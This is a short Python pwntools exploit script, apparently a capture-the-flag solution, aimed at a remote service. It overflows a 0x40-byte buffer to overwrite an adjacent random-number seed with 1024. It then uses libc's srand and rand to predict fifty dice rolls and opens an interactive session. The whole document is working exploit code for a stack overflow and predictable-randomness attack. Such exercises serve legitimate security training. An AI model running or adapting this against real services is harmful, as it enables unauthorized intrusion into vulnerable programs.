from pwn import *
from ctypes import *

#p = process('./1')
p = remote('220.249.52.133','58417')
p.recv()
payload = 'a'*(0x40)+p64(1024)+p64(1024)
print(payload)
p.sendline(payload)
libc = cdll.LoadLibrary('./libc.so.6')
libc.srand(1024)
for i in range(50):
    p.sendline(str(libc.rand()%6+1))
    
p.interactive()
